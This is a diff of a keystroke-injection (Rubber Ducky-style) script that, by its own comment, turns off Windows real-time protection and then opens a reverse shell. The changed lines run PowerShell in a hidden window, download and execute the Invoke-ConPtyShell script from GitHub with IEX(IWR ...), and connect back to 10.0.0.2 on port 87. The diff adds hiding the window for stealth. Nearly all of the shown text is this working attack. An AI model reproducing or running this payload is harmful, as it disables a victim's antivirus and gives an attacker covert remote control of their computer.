@@ -1,6 +1,6 @@
 REM Turn off Real-time protection and start reverse shell
 DELAY 1000
-GUI i
+GUI i 
 DELAY 500
 TAB
 DELAY 100
@@ -47,13 +47,10 @@ ALT F4
 DELAY 500
 ALT F4
 DELAY 500
-GUI r
-DELAY 100
 REM execute powershell command to start reverse shell script [don't forget to change IP]
-STRING powershell 
-ENTER
+GUI r 
 DELAY 300
-STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87
-DELAY 200
+STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87"
+DELAY 300
 ENTER
 DELAY 200
